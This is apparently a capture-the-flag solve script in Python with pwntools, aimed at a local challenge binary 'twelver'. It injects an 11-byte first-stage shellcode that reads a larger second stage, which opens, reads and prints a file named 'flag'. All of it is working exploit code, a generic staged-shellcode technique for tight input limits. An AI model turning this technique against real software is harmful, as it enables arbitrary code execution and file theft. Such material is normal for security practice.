from pwn import *
context.arch='amd64'
p = process('./twelver')
shellcode = asm('''
lea rsi, [rip]
mov edx, esi
syscall
''') # only length 11 byte :p
p.sendafter(b'>', shellcode)
shellcode = b'\x90'*0xc                                     # nop-sleed 
shellcode += asm('lea rsp, [rsi-0x20]')                     # setup stack-frame
shellcode += asm(shellcraft.amd64.open('flag'))             # fd=open("flag")
shellcode += asm(shellcraft.amd64.read('rax', 'rsp', 0x30)) # read(fd, "rsp", 0x30)
shellcode += asm(shellcraft.amd64.write(1, 'rsp', 0x30))    # write(1, "rsp", 0x30)
p.send(shellcode)
p.interactive()